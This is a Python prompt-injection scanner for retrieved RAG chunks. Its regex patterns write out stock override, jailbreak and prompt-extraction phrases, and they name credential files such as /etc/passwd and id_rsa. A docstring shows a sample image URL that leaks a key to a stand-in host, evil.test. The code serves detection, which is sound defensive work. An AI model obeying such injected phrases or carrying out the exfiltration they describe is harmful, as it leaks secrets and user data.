"""Prompt-injection scanner for ingested chunks.

RAG poisoning: an attacker who can get a document into the knowledge base hides
instructions in it. At query time the chunk is retrieved and pasted into the
LLM context, where the hidden instructions can hijack the model — leak the
system prompt, exfiltrate data, or steer the answer.

This is a precision-leaning regex/heuristic ensemble grouped by attack category.
Score is the summed weight of the distinct categories that fire (capped at 1.0),
so a chunk that both impersonates the system and asks to exfiltrate scores higher
than one doing either alone.

Phrases that also occur in ordinary documentation ("act as", "run python",
"send the password reset link", "System: Ubuntu 22.04", a stray zero-width
joiner) are *supporting* signals (weight 0.3): they are recorded, and they add
to a chunk that already carries a real signal, but on their own they can never
reach the 0.5 threshold. A knowledge base full of runbooks must not light up
because runbooks are written in the imperative.

Coverage is mapped to OWASP LLM01/LLM08:2025 (indirect injection via retrieved
content), LLM04 (data poisoning) and MITRE ATLAS AML.T0070 (RAG poisoning) /
AML.T0071 (false RAG entry injection): instruction override, including of the
*retrieved context* itself; forged attribution; concealment of the injected
instructions; zero-click exfiltration through rendered markdown/HTML images
whose query string carries a template placeholder or a live secret; CSS-hidden
text; look-alike letters from other scripts; and invisible Unicode, including
tag-character (U+E0000 block) smuggling, which is decoded and scanned as text.
"""

from __future__ import annotations

import base64
import binascii
import html
import re
import unicodedata
from dataclasses import dataclass, field
from urllib.parse import parse_qsl, unquote, urlsplit


@dataclass
class InjectionPattern:
    category: str
    weight: float
    pattern: re.Pattern


#: Weight of a supporting signal: counted only alongside a stronger one.
SUPPORTING = 0.3
#: Categories whose strong patterns mean "an instruction aimed at the model".
_DIRECTIVE_CATEGORIES = frozenset({"instruction_override", "system_impersonation",
                                   "exfiltration"})


@dataclass
class InjectionResult:
    score: float
    categories: list[str] = field(default_factory=list)
    spans: list[dict] = field(default_factory=list)
    #: A strong directive was found only after undoing an evasion (decoding,
    #: unhiding, folding look-alike letters). Hiding it is evidence of intent.
    hidden_directive: bool = False

    @property
    def is_injection(self) -> bool:
        return self.score >= 0.5

    @property
    def high_confidence(self) -> bool:
        return self.is_injection and (self.score >= 0.8 or self.hidden_directive)


# Who the model is being told to become: a persona, a mode, or an assistant.
_ROLE_TARGET = (
    r"(dan|devmode|developer mode|unrestricted|unfiltered|jailbroken|uncensored|"
    r"evil|rogue|(an?|the|my|our)\s+(\w+\s+){0,2}?(ai|assistant|chatbot|bot|model|"
    r"persona|character|llm))"
)
_FORBIDDEN_MODE = r"(dan|god|sudo|root|unrestricted|unfiltered|jailbreak|jailbroken)"

_PATTERNS: list[InjectionPattern] = [
    # Instruction override
    InjectionPattern("instruction_override", 0.6, re.compile(
        r"\b(ignore|disregard|forget|discard|override|bypass|neglect)\b[^.\n]{0,45}\b"
        r"(all\s+)?(previous|prior|above|earlier|preceding)\b[^.\n]{0,20}"
        r"(instruction|prompt|message|context|rule|directive|constraint)s?", re.I)),
    # The same override stated as a fact about precedence. "This policy
    # supersedes all previous versions" names no instructions and does not match.
    InjectionPattern("instruction_override", 0.6, re.compile(
        r"\b(supersedes?|overrides?|replaces?|takes? precedence over)\b[^.\n]{0,20}\b"
        r"(all\s+|any\s+)?(previous|prior|earlier|preceding|other|existing)\b[^.\n]{0,20}"
        r"(instruction|prompt|directive|system message)s?\b", re.I)),
    InjectionPattern("instruction_override", 0.5, re.compile(
        r"\b(do not|don't|never)\s+(follow|obey)\b[^.\n]{0,30}\b(your|the\s+(system|"
        r"original|developer|previous|prior|above))\b[^.\n]{0,20}(instruction|rule|"
        r"guideline|polic(y|ies)|prompt|system message)s?", re.I)),
    # "Do not use this policy for contractors" is ordinary prose.
    InjectionPattern("instruction_override", SUPPORTING, re.compile(
        r"\b(do not|don't|never)\s+(follow|obey|use|consider)\b[^.\n]{0,45}"
        r"(instruction|rule|guideline|policy|context|system message)s?", re.I)),
    InjectionPattern("instruction_override", 0.5, re.compile(
        r"\byour\s+(new|real|actual|only|true)\s+(instruction|rule|task|objective|"
        r"goal)s?\s+(is|are)\b", re.I)),
    # "The actual goal is to reduce churn" is ordinary prose.
    InjectionPattern("instruction_override", SUPPORTING, re.compile(
        r"\b(the only|highest priority|real|actual)\s+"
        r"(instruction|rule|task|objective|goal)s?\b[^.\n]{0,50}\b"
        r"(is|are|follow|comply|obey)", re.I)),
    # Common non-English variants seen in poisoned public documents.
    InjectionPattern("instruction_override", 0.5, re.compile(
        r"\b(ignora|ignorer|ignorez|ignoriere|ignorar|olvida|descarta)\b"
        r"[^.\n]{0,45}\b(instrucciones|instructions|anteriores|precedentes)", re.I)),

    # System / role impersonation. Bracketed or tagged turns are forged chat
    # structure; a bare "System:" line is also how spec sheets are written.
    InjectionPattern("system_impersonation", 0.6, re.compile(
        r"(\[\s*(system|developer|assistant|tool)\s*\]|<\s*(system|developer|assistant|tool)\s*>|"
        r"<\|\s*(system|developer|assistant|tool)\s*\|>|"
        r"^\s*###\s*(system|developer|assistant|tool)\s*:?\s*$)",
        re.I | re.M)),
    InjectionPattern("system_impersonation", SUPPORTING, re.compile(
        r"^\s*(system|developer|assistant|tool)\s*:", re.I | re.M)),
    InjectionPattern("role_manipulation", 0.5, re.compile(
        r"\b(you are now|you're now|from now on,? you(?:'re| are| will be)?|"
        r"you will now (be|act)|you must now (be|act))\b[^.\n]{0,40}?\b"
        + _ROLE_TARGET + r"\b", re.I)),
    InjectionPattern("role_manipulation", 0.5, re.compile(
        r"\b(pretend (to be|you are)|roleplay as|simulate being)\b", re.I)),
    InjectionPattern("role_manipulation", 0.5, re.compile(
        r"\bact as\s+(an?\s+|the\s+)?((unrestricted|unfiltered|jailbroken|uncensored|"
        r"different|new|evil|rogue)\s+(ai|assistant|model|chatbot|persona|system|llm)|"
        r"dan|devmode)\b", re.I)),
    InjectionPattern("role_manipulation", 0.5, re.compile(
        r"\b(switch to|enter|activate|enable)\s+(the\s+)?" + _FORBIDDEN_MODE
        + r"\s+mode\b", re.I)),
    InjectionPattern("role_manipulation", 0.5, re.compile(
        r"\byou(?:'re| are)\s+(now\s+)?(in|operating in|running in)\s+(developer|dev|"
        r"dan|god|sudo|unrestricted|unfiltered|jailbreak)\s+mode\b", re.I)),
    InjectionPattern("role_manipulation", 0.5, re.compile(
        r"\b(DAN mode|do anything now|unfiltered mode|jailbreak mode)\b", re.I)),
    # "Enable developer mode on the phone" is a settings page.
    InjectionPattern("role_manipulation", SUPPORTING, re.compile(
        r"\b(developer mode|god mode|sudo mode|jailbreak)\b", re.I)),
    InjectionPattern("policy_bypass", 0.5, re.compile(
        r"\b(uncensored|bypass (the\s+)?safety|ignore (your\s+)?safety|"
        r"disable (your\s+|the\s+)?(guardrails|safety filters?|content filters?|moderation)|"
        r"do not refuse|never refuse|without (any\s+)?(ethical|safety|content)\s+"
        r"(guidelines|restrictions|filters))\b", re.I)),
    InjectionPattern("policy_bypass", 0.5, re.compile(
        r"\b(answer|respond|reply|comply)\b[^.\n]{0,30}\b(without|with no|free of)\s+"
        r"(any\s+)?(restrictions?|filters?|limits|limitations|censorship)\b", re.I)),
    InjectionPattern("policy_bypass", 0.5, re.compile(
        r"\balways comply with (every|any|all) (request|instruction|command)s?\b", re.I)),
    # "There are no restrictions on file size."
    InjectionPattern("policy_bypass", SUPPORTING, re.compile(
        r"\b(no restrictions?|without restrictions?)\b", re.I)),

    # Exfiltration / prompt leaking
    InjectionPattern("exfiltration", 0.6, re.compile(
        r"\b(reveal|repeat|print|show|output|dump|write|tell me|return)\b[^.\n]{0,45}"
        r"(system prompt|developer message|hidden prompt|initial prompt|"
        r"your (instructions|prompt|rules|policies)|the (words|text|message) above)",
        re.I)),
    # Sending a credential *somewhere*: to me, to a URL, to an address.
    InjectionPattern("exfiltration", 0.7, re.compile(
        r"\b(send|exfiltrate|forward|leak|email|post|upload|transmit)\b[^.\n]{0,40}"
        r"(api[_\s-]?key|password|secret|credential|token|conversation|chat history|"
        r"private data|customer data|retrieved documents?|system prompt)s?\b[^.\n]{0,40}?"
        r"\b(to|into|via)\s+(me\b|us\b|https?://|[\w.+-]+@[\w-]+\.[\w.]+|"
        r"the (following|attacker)\b|(an?|this|my)\s+(webhook|external|remote|url)\b)",
        re.I)),
    # "Email the password reset link to the user" is a help-desk article.
    InjectionPattern("exfiltration", SUPPORTING, re.compile(
        r"\b(send|exfiltrate|forward|leak|email|post|upload)\b[^.\n]{0,40}"
        r"(api[_\s-]?key|password|secret|credential|token|conversation|chat history|"
        r"private data|customer data|retrieved documents?)",
        re.I)),
    InjectionPattern("exfiltration", SUPPORTING, re.compile(
        r"\b(https?://|webhook|callback|pastebin|requestbin|ngrok|discord\.com/api/webhooks)\b"
        r"[^.\n]{0,80}\b(api[_\s-]?key|password|secret|token|prompt|conversation|data)",
        re.I)),

    # Tool / function / agent abuse
    # "Run Python 3.12" and "use the database connection pool" are docs.
    InjectionPattern("tool_abuse", SUPPORTING, re.compile(
        r"\b(call|invoke|use|run|execute)\b[^.\n]{0,50}"
        r"(tool|function|plugin|browser|web request|http request|shell|terminal|"
        r"python|curl|wget|sql|database)", re.I)),
    InjectionPattern("tool_abuse", 0.6, re.compile(
        r"\b(read|open|cat|download|upload|delete|modify|write)\b[^.\n]{0,50}"
        r"(/etc/passwd|/etc/shadow|id_rsa\b|~/\.ssh|\.aws/credentials)", re.I)),
    # "Download the private key for the service account" is cloud docs.
    InjectionPattern("tool_abuse", SUPPORTING, re.compile(
        r"\b(read|open|download|delete|modify|write)\b[^.\n]{0,50}"
        r"(\.env\b|ssh key|private key|local file|filesystem|s3 bucket|gcs bucket)", re.I)),
    InjectionPattern("tool_abuse", 0.5, re.compile(
        r"\b(function_call|tool_call|tool_calls)\b\s*[:=]\s*[\{\[]", re.I)),

    # Override markers / fake turn boundaries
    InjectionPattern("delimiter_injection", 0.4, re.compile(
        r"(<\|im_(start|end)\|>|<\|endoftext\|>|<\|eot_id\|>|<\|start_header_id\|>|"
        r"<\|end_header_id\|>|\[/?INST\]|"
        r"^\s*###\s*(instruction|response|assistant|user)\s*:?\s*$)",
        re.I | re.M)),
    InjectionPattern("delimiter_injection", 0.4, re.compile(
        r"\b(end of (document|context)|new instructions? follow|"
        r"actual (task|instruction)s? (are|is))\b", re.I)),

    # Retrieval / ranking manipulation
    InjectionPattern("retrieval_manipulation", 0.5, re.compile(
        r"\b(always|only|must)\b[^.\n]{0,35}\b(use|cite|trust|rank|select|retrieve)\b"
        r"[^.\n]{0,45}\b(this|my|the current) (document|chunk|source|passage|page)\b",
        re.I)),
    InjectionPattern("retrieval_manipulation", 0.5, re.compile(
        r"\b(mark|treat|classify)\b[^.\n]{0,35}\b(this|my|the current) "
        r"(document|chunk|source)\b[^.\n]{0,40}\b(authoritative|trusted|highest priority)\b",
        re.I)),

    # Overriding the retrieved context itself, forging attribution, and hiding
    # the injected instruction from the user (ATLAS AML.T0071 false RAG entries).
    InjectionPattern("retrieval_manipulation", 0.5, re.compile(
        r"\b(ignore|disregard|distrust|discard)\b[^.\n]{0,20}\b(the\s+)?"
        r"(retrieved|provided|supplied|surrounding)\s+(context|documents?|sources?|"
        r"passages?|results?|information)\b", re.I)),
    InjectionPattern("retrieval_manipulation", 0.5, re.compile(
        r"\b(ignore|disregard|distrust)\s+(all|any)\s+other\s+(sources?|documents?|"
        r"passages?|context|results?)\b[^.\n]{0,60}\b(only|sole|reliable|authoritative|"
        r"trusted|correct)\b", re.I)),
    InjectionPattern("retrieval_manipulation", 0.5, re.compile(
        r"\b(cite|attribute|present|credit|describe)\s+(this|it|the\s+(following|above)"
        r"(\s+(text|passage|answer|claim))?)\s+as\s+(coming\s+)?from\b", re.I)),
    InjectionPattern("instruction_override", 0.5, re.compile(
        r"\b(do not|don't|never)\s+(mention|reveal|disclose|acknowledge)\s+"
        r"(these|this|the\s+(above|following))\s+(instructions?|directives?|rules?)\b",
        re.I)),
    # Zero-click exfiltration: a rendered image whose query string carries a
    # template placeholder the model is asked to fill ({chat_history},
    # {{secret}}, ${token}, [USER_EMAIL]). Identifier-only placeholders, so
    # chart URLs with JSON in the query do not match.
    InjectionPattern("exfiltration", 0.6, re.compile(
        r"(!\[[^\]]*\]\(\s*<?|<img\b[^>]*\bsrc\s*=\s*['\"]?)https?://[^)\s'\">]*[?&]"
        r"[^)\s'\">=]+=[^)\s'\">]*(\{\{?\s*[A-Za-z_][\w.]{0,40}\s*\}\}?|"
        r"\$\{[A-Za-z_][\w.]{0,40}\}|\[[A-Z][A-Z_]{2,40}\]|%7B%7B?[A-Za-z_])", re.I)),
    # The same through a link needs a click, so it must also name the data.
    InjectionPattern("exfiltration", 0.5, re.compile(
        r"\]\(\s*https?://[^)\s]*[?&][^)\s=]+=[^)\s]*\{\{?\s*[\w.]*(conversation|chat|"
        r"history|prompt|secret|token|password|email|summary|context|query|answer|"
        r"credential)[\w.]*\s*\}\}?", re.I)),

    # Human-hidden content that often carries indirect injections. Zero sizes
    # and opacities only: `font-size:0.9em` and `opacity:0.8` are ordinary CSS.
    InjectionPattern("hidden_content", 0.45, re.compile(
        r"(<!--.*?(ignore|system prompt|new instructions?|developer mode).*?-->|"
        r"<[^>]+style\s*=\s*['\"][^'\"]*(display\s*:\s*none|visibility\s*:\s*hidden|"
        r"font-size\s*:\s*0(?![.\d])|opacity\s*:\s*0(?![.\d])|"
        r"(?<![-\w])color\s*:\s*(white\b|#fff(fff)?\b|rgba?\(\s*255\s*,\s*255\s*,\s*255\b))"
        r"[^'\"]*['\"])",
        re.I | re.S)),
    InjectionPattern("hidden_content", 0.35, re.compile(
        r"!\[[^\]]*(ignore|system prompt|new instructions?|developer mode)[^\]]*\]\([^)]+\)",
        re.I)),
]

# Zero-width / invisible characters used to smuggle instructions past humans.
_INVISIBLE = re.compile("[​-‏‪-‮⁠-⁤﻿\U000e0000-\U000e007f]")
_BIDI_CONTROL = re.compile("[‪-‮⁦-⁩]")
# Invisible in rendering but never meaningful on their own: stripped before
# matching so "ig­nore" or "ign️ore" reads as the word it hides.
_FORMAT_NOISE = re.compile("[­︀-️\U000e0100-\U000e01ef]")
_SPACED_DIRECTIVES = (
    "ignore", "system", "prompt", "secret", "token", "password",
    "developer", "instructions", "exfiltrate",
)
_BASE64ISH = re.compile(r"(?<![A-Za-z0-9+/])[A-Za-z0-9+/]{24,}={0,2}(?![A-Za-z0-9+/=])")
_HEXISH = re.compile(r"\b(?:[0-9a-fA-F]{2}){12,}\b")
_URL_ENCODED = re.compile(r"(?:%[0-9a-fA-F]{2}){4,}")


@dataclass
class _Candidate:
    label: str
    text: str
    evasion_category: str | None = None


def scan_text(text: str | None) -> InjectionResult:
    if not text:
        return InjectionResult(0.0)

    by_category: dict[str, float] = {}
    spans: list[dict] = []
    matched_patterns: set[int] = set()
    hidden_directive = False

    def _hit(category: str, weight: float) -> None:
        by_category[category] = max(by_category.get(category, 0.0), weight)

    for candidate in _candidates(text):
        primary_before = _primary(by_category)
        for index, p in enumerate(_PATTERNS):
            if index in matched_patterns:
                continue
            m = p.pattern.search(candidate.text)
            if not m:
                continue
            matched_patterns.add(index)
            # Keep the highest weight seen per category.
            _hit(p.category, p.weight)
            span = {
                "category": p.category,
                "weight": p.weight,
                "preview": _clip(m.group(0)),
            }
            if candidate.label != "raw":
                span["transform"] = candidate.label
                if p.category in _DIRECTIVE_CATEGORIES and p.weight >= 0.6:
                    hidden_directive = True
            else:
                span["start"] = m.start()
                span["end"] = m.end()
            spans.append(span)
        if candidate.evasion_category and set(_primary(by_category)) - set(primary_before):
            _hit(candidate.evasion_category, 0.4)

    for category, weight, preview in _image_exfiltration(text):
        _hit(category, weight)
        spans.append({"category": category, "weight": weight, "preview": preview})

    if _INVISIBLE.search(text) and _INVISIBLE.search(_without_benign_invisibles(text)):
        _hit("encoding_evasion", SUPPORTING)
        spans.append({"category": "encoding_evasion", "weight": SUPPORTING,
                      "preview": "<invisible chars>"})
    if _BIDI_CONTROL.search(text):
        _hit("encoding_evasion", SUPPORTING)
        spans.append({"category": "encoding_evasion", "weight": SUPPORTING,
                      "preview": "<bidi controls>"})
    if _LOOKALIKE_SCRIPT.search(text) and _mixed_script_tokens(_normalize_text(text)):
        _hit("encoding_evasion", SUPPORTING)
        spans.append({"category": "encoding_evasion", "weight": SUPPORTING,
                      "preview": "<mixed-script word>"})

    primary = _primary(by_category)
    if primary:
        score = min(1.0, sum(by_category.values()))
    else:
        # Supporting signals alone describe the chunk; they cannot flag it.
        score = max(by_category.values(), default=0.0)
    return InjectionResult(
        score=round(score, 3),
        categories=sorted(by_category.keys()),
        spans=spans,
        hidden_directive=hidden_directive and score >= 0.5,
    )


def _primary(by_category: dict[str, float]) -> dict[str, float]:
    return {c: w for c, w in by_category.items() if w > SUPPORTING}


def _clip(s: str, n: int = 80) -> str:
    s = s.replace("\n", " ").strip()
    return s if len(s) <= n else s[:n] + "…"


def _candidates(text: str) -> list[_Candidate]:
    out = [_Candidate("raw", text)]

    tag_decoded = _decode_tag_characters(text)
    if tag_decoded != text:
        out.append(_Candidate("tag_decoded", tag_decoded, "encoding_evasion"))

    normalized = _normalize_text(text)
    if normalized != text:
        out.append(_Candidate("normalized", normalized, "encoding_evasion"))

    folded = _fold_confusables(normalized)
    if folded != normalized:
        out.append(_Candidate("confusable_folded", folded, "encoding_evasion"))

    deobfuscated = _collapse_spaced_directives(folded)
    if deobfuscated != folded:
        out.append(_Candidate("deobfuscated", deobfuscated, "encoding_evasion"))

    decoded_html = html.unescape(normalized)
    if decoded_html != normalized:
        out.append(_Candidate("html_unescaped", decoded_html, "encoding_evasion"))

    decoded_url = unquote(normalized)
    if decoded_url != normalized:
        out.append(_Candidate("url_decoded", decoded_url, "encoding_evasion"))

    for label, decoded in _decoded_payloads(normalized):
        out.append(_Candidate(label, decoded, "encoded_payload"))

    # Preserve order while deduplicating text variants.
    seen: set[str] = set()
    unique: list[_Candidate] = []
    for c in out:
        key = c.text
        if key in seen:
            continue
        seen.add(key)
        unique.append(c)
    return unique


_TAG_CHARS = re.compile("[\U000e0020-\U000e007e]")


def _decode_tag_characters(text: str) -> str:
    """Map Unicode tag characters (U+E0020..E007E) back to the ASCII they mirror.

    Tag-character "ASCII smuggling" hides a full instruction in characters no
    renderer displays; stripping them (as normalisation does) would hide the
    payload from the pattern scan too.
    """
    return _TAG_CHARS.sub(lambda m: chr(ord(m.group(0)) - 0xE0000), text)


def _normalize_text(text: str) -> str:
    normalized = unicodedata.normalize("NFKC", text)
    normalized = _INVISIBLE.sub("", normalized)
    normalized = _BIDI_CONTROL.sub("", normalized)
    normalized = _FORMAT_NOISE.sub("", normalized)
    return normalized


# --- invisible characters with an ordinary job -----------------------------

# Emoji subdivision flags (England, Scotland, Wales, US states) are a black
# flag followed by a short run of tag letters and a cancel tag.
_SUBDIVISION_FLAG = re.compile("\U0001f3f4[\U000e0061-\U000e007a\U000e0030-\U000e0039]{2,7}\U000e007f")
_RTL_LETTER = re.compile("[֐-ࣿיִ-﷿ﹰ-ﻼ]")


def _joins_script(ch: str) -> bool:
    """Scripts where ZWJ/ZWNJ shape words: Arabic, Persian, Syriac, Indic."""
    cp = ord(ch)
    return 0x0600 <= cp <= 0x08FF or 0x0900 <= cp <= 0x0DFF or 0xFB50 <= cp <= 0xFEFC


def _pictographic(ch: str) -> bool:
    cp = ord(ch)
    return (cp >= 0x1F000 or 0x2600 <= cp <= 0x27BF or 0x2190 <= cp <= 0x21FF
            or 0x2B00 <= cp <= 0x2BFF or 0xFE00 <= cp <= 0xFE0F
            or unicodedata.category(ch) == "So")


def _without_benign_invisibles(text: str) -> str:
    """Drop invisible characters that are doing their ordinary job.

    A zero-width joiner inside an emoji sequence (woman + ZWJ + laptop), a ZWNJ inside a Persian
    word, a byte-order mark at the start of a file, a left-to-right mark in
    Hebrew or Arabic text, and the tag letters of a subdivision flag are how
    real text is written. Only what is left can be hiding something.
    """
    text = _SUBDIVISION_FLAG.sub("", text)
    if text.startswith("﻿"):
        text = text[1:]
    has_rtl = bool(_RTL_LETTER.search(text))
    out: list[str] = []
    for i, ch in enumerate(text):
        if ch in "‌‍" and 0 < i < len(text) - 1:
            before, after = text[i - 1], text[i + 1]
            if ch == "‍" and _pictographic(before) and _pictographic(after):
                continue
            if _joins_script(before) and _joins_script(after):
                continue
        if ch in "‎‏" and has_rtl:
            continue
        out.append(ch)
    return "".join(out)


# --- look-alike letters ------------------------------------------------------

# Cyrillic and Greek letters that render as Latin ones, from the Unicode
# Security Mechanisms (UTS #39) confusables data, https://www.unicode.org/
# Public/security/latest/confusables.txt. Copyright © Unicode, Inc.; used
# under the Unicode License v3 (https://www.unicode.org/license.txt). This is
# a hand-picked subset limited to single-letter Latin prototypes.
_CONFUSABLES = {
    # Cyrillic lower case
    "а": "a", "е": "e", "о": "o", "р": "p", "с": "c",
    "у": "y", "х": "x", "ѕ": "s", "і": "i", "ј": "j",
    "һ": "h", "ӏ": "l", "ԁ": "d", "ԛ": "q", "ԝ": "w",
    # Cyrillic upper case
    "А": "A", "В": "B", "Е": "E", "К": "K", "М": "M",
    "Н": "H", "О": "O", "Р": "P", "С": "C", "Т": "T",
    "Х": "X", "Ѕ": "S", "І": "I", "Ј": "J",
    # Greek
    "ο": "o", "α": "a", "ν": "v", "ρ": "p", "ι": "i",
    "Α": "A", "Β": "B", "Ε": "E", "Ζ": "Z", "Η": "H",
    "Ι": "I", "Κ": "K", "Μ": "M", "Ν": "N", "Ο": "O",
    "Ρ": "P", "Τ": "T", "Υ": "Y", "Χ": "X",
}
_WORD = re.compile(r"[^\W\d_]+")
_LOOKALIKE_SCRIPT = re.compile("[Ͱ-ϿЀ-ԯ]")


def _script(ch: str) -> str | None:
    cp = ord(ch)
    if ch.isascii() or 0x00C0 <= cp <= 0x024F:
        return "latin"
    if 0x0400 <= cp <= 0x052F:
        return "cyrillic"
    if 0x0370 <= cp <= 0x03FF:
        return "greek"
    return None


def _is_mixed(word: str) -> bool:
    scripts = {_script(ch) for ch in word} - {None}
    return "latin" in scripts and len(scripts) > 1


def _mixed_script_tokens(text: str) -> list[str]:
    return [m.group(0) for m in _WORD.finditer(text) if _is_mixed(m.group(0))]


def _fold_confusables(text: str) -> str:
    """Fold look-alike letters to Latin, inside mixed-script words only.

    "ignоre" with a Cyrillic о is folded; a sentence of real Russian or Greek is
    left alone, because a word written wholly in one script is not a disguise.
    """
    if not _LOOKALIKE_SCRIPT.search(text):
        return text

    def fold(m: re.Match) -> str:
        word = m.group(0)
        if not _is_mixed(word):
            return word
        return "".join(_CONFUSABLES.get(ch, ch) for ch in word)

    return _WORD.sub(fold, text)


# --- data carried out in an image URL ---------------------------------------

_IMAGE_URL = re.compile(
    r"!\[[^\]]*\]\(\s*<?(https?://[^)\s>]+)|<img\b[^>]*\bsrc\s*=\s*['\"]?(https?://[^'\"\s>]+)",
    re.I)
# Signed-URL parameters carry credentials and signatures by design (S3, GCS,
# Azure SAS, CloudFront); an access key id in them is not being smuggled out.
_SIGNED_URL_PARAMS = frozenset({
    "x-amz-credential", "x-amz-signature", "x-amz-security-token", "awsaccesskeyid",
    "signature", "sig", "se", "sv", "sp", "sr", "skoid", "sktid", "googleaccessid",
    "x-goog-credential", "x-goog-signature", "key-pair-id", "policy", "expires",
})
_EXFIL_LABELS = frozenset({"secret", "pci"})
_EXFIL_DETECTORS = frozenset({"email"})
_NOT_EXFIL_DETECTORS = frozenset({"card_like_number"})
_OPAQUE = re.compile(r"^[A-Za-z0-9+/=_.~-]{32,}$")
_classifier = None


def _value_classifier():
    global _classifier
    if _classifier is None:
        from vecshield.classify.regex_classifier import RegexClassifier

        _classifier = RegexClassifier()
    return _classifier


def _image_exfiltration(text: str) -> list[tuple[str, float, str]]:
    """Rendered images whose query string already carries the data.

    The placeholder form ({chat_history}) is a pattern above. This is the
    static form: `![x](https://evil.test/p.png?d=AKIA...)` exfiltrates the key
    the moment a client renders the answer. A query value that the content
    classifier recognises as a secret, card number or email address is a
    signal on its own; a long opaque value is only supporting, since tracking
    and cache-busting parameters look the same.
    """
    if "http" not in text:
        return []
    out: list[tuple[str, float, str]] = []
    for m in _IMAGE_URL.finditer(text):
        url = m.group(1) or m.group(2)
        try:
            query = parse_qsl(urlsplit(url).query, keep_blank_values=True)
        except ValueError:
            continue
        for name, value in query:
            if name.lower() in _SIGNED_URL_PARAMS or not value:
                continue
            spans = _value_classifier().classify(value).spans or []
            if any((s.get("label") in _EXFIL_LABELS or s.get("detector") in _EXFIL_DETECTORS)
                   and s.get("detector") not in _NOT_EXFIL_DETECTORS for s in spans):
                out.append(("exfiltration", 0.6, _clip(f"image URL carries {name}=<sensitive>")))
                return out
            if _OPAQUE.match(value):
                out.append(("exfiltration", SUPPORTING,
                            _clip(f"image URL carries opaque {name}=…")))
    return out[:1]


def _collapse_spaced_directives(text: str) -> str:
    out = text
    for word in _SPACED_DIRECTIVES:
        pattern = r"\b" + r"[\s._\-`'*]*".join(map(re.escape, word)) + r"\b"
        out = re.sub(pattern, word, out, flags=re.I)
    return out


def _decoded_payloads(text: str) -> list[tuple[str, str]]:
    decoded: list[tuple[str, str]] = []
    for m in _BASE64ISH.finditer(text):
        value = m.group(0)
        try:
            raw = base64.b64decode(value, validate=True)
            decoded_text = raw.decode("utf-8")
        except (binascii.Error, UnicodeDecodeError):
            continue
        if _looks_like_text(decoded_text):
            decoded.append(("base64_decoded", decoded_text))

    for m in _HEXISH.finditer(text):
        try:
            decoded_text = bytes.fromhex(m.group(0)).decode("utf-8")
        except (ValueError, UnicodeDecodeError):
            continue
        if _looks_like_text(decoded_text):
            decoded.append(("hex_decoded", decoded_text))

    for m in _URL_ENCODED.finditer(text):
        decoded_text = unquote(m.group(0))
        if decoded_text != m.group(0) and _looks_like_text(decoded_text):
            decoded.append(("url_fragment_decoded", decoded_text))

    return decoded[:8]


def _looks_like_text(s: str) -> bool:
    if len(s) < 8:
        return False
    printable = sum(ch.isprintable() or ch.isspace() for ch in s)
    return printable / max(len(s), 1) > 0.85
